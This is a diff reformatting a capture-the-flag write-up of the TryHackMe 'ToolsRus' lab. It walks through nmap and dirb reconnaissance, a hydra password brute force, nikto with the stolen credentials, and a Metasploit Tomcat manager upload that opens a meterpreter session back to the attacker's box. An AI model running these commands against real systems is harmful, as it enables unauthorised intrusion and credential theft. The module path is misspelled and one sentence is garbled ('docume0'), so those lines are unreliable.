@@ -2,18 +2,18 @@
 
 | Stat       | Value                                        |
 | ---------- | -------------------------------------------- |
-| Image      | <img src="../../images/write_ups/try_hack_me/tools_r_us/tools_r_us.jpeg" alt="ToolsRus" width="90"/> |
+| Image      | <img src="/images/write_ups/try_hack_me/tools_r_us/tools_r_us.jpeg" alt="ToolsRus" width="90"/> |
 | Room       | ToolsRus                         |
 | URL        | https://tryhackme.com/room/toolsrus     |
 | Difficulty | Easy                                         |
 
 ## Concepts/Tools Used
 
-- [Dirb](../../tools/dirb.md)
-- [Hydra](../../tools/hydra.md)
-- [Nmap](../../tools/nmap.md)
-- [Nikto](../../tools/nikto.md)
-- [Metasploit](../../tools/msfconsole.md)
+- [dirb](/tools/dirb.md)
+- [hydra](/tools/hydra.md)
+- [nmap](/tools/nmap.md)
+- [nikto](/tools/nikto.md)
+- [msfconsole](/tools/msfconsole.md)
 
 ## Room Description
 
@@ -35,15 +35,21 @@ This room presents a series of questions that needs to be answered using differe
 
 First of all, I run a couple of nmap commands to find out what ports are open and what software is listening on those ports. I run the following command:
 
-`nmap -p- -Pn -T5 -v target.thm`
+```bash
+$ nmap -p- -Pn -T5 -v target.thm
+```
 
 Then I run to following based on what ports were discovered in the previous command:
 
-`nmap -A -Pn -v target.thm -p 22,80,1234,8009`
+```bash
+$ nmap -A -Pn -v target.thm -p 22,80,1234,8009
+```
 
 Port 80 has the http service running on it. It has Apache 2.4.18 running. So now I know what port we need to run `dirb` on. I run the following command to answer the question:
 
-`dirb http://target.thm /usr/share/wordlists/dirb/common.txt`
+```bash
+$ dirb http://target.thm /usr/share/wordlists/dirb/common.txt
+```
 
 The output mentions a directory that starts with a "g". Here is the output:
 
@@ -76,9 +82,11 @@ I pulled up the middle result in a browser and sure enough it wanted basic authe
 
 ## What is bob's password to the protected part of the website?
 
-I have a username, and now I need to try and brute force a password for the user bob. I have documentation on how to [break basic authentication using hydra](../../tools/hydra.md#http-get). I copy that guide and run the following command:
+I have a username, and now I need to try and brute force a password for the user bob. I have documentation on how to [break basic authentication using hydra](/tools/hydra.md#http-get). I copy that guide and run the following command:
 
-`hydra -l bob -P /usr/share/wordlists/rockyou.txt http-get://target.thm/protected/`
+```bash
+$ hydra -l bob -P /usr/share/wordlists/rockyou.txt http-get://target.thm/protected/
+```
 
 I waited a moment and got the following output:
 
@@ -126,7 +134,9 @@ The last line of output for port 1234 tells the name and version of the software
 
 When I go to the url that it is asking for (http://target.thm:1234/manager/html), it wants me to put in a username and password. I try the combination that I found earlier and I am able to login. You can see the answer to this question on the manager page or you can enter the following command and wait for nikto to finish:
 
-`nikto -h http://target.thm:1234/manager/html -id bob:bubbles`
+```bash
+$ nikto -h http://target.thm:1234/manager/html -id bob:bubbles
+```
 
 There are 5 docume0. Here is the list:
 
@@ -152,24 +162,30 @@ As I just mentioned, the version number is 1.1.
 
 I run `msfconsole` to bring up Metasploit. I use the search feature to find a vulnerability. Here is the what I search for:
 
-`search tomcat`
+```bash
+msf6 > search tomcat
+```
 
 In the output I only looked for modules that had an excellent rating and mentioned the manager. That leaves me with 2 options:
 
-`exploit/multi/http/tomcat_mgr_deploy`
+```bash
+msf6 > exploit/multi/http/tomcat_mgr_deploy
+```
 
 and
 
-`exploit/mult/http/tomcate_mgr_upload`
+```bash
+msf6 > exploit/mult/http/tomcate_mgr_upload
+```
 
 In this case I tried the latter. I took a look at the options that this module needs by running `show options`. I needed to change a few options for I ran the following commands:
 
 ```bash
-set httppassword xxxxxxx
-set httpusername xxx
-set rhosts target.thm
-set rport 1234
-set lhost my_attack_box_ip_address
+msf6 > set httppassword xxxxxxx
+msf6 > set httpusername xxx
+msf6 > set rhosts target.thm
+msf6 > set rport 1234
+msf6 > set lhost my_attack_box_ip_address
 ```
 
 Once I had those options set I ran the `run` command. My prompt changed to `meterpreter > ` to indicate that I was on the machine. From here I ran the `getuid` command to find out who I was running as so I could answer the question.
@@ -178,4 +194,6 @@ Once I had those options set I ran the `run` command. My prompt changed to `mete
 
 I ran the following command to get the flag:
 
-`cat /root/flag.txt`
+```bash
+$ cat /root/flag.txt
+```
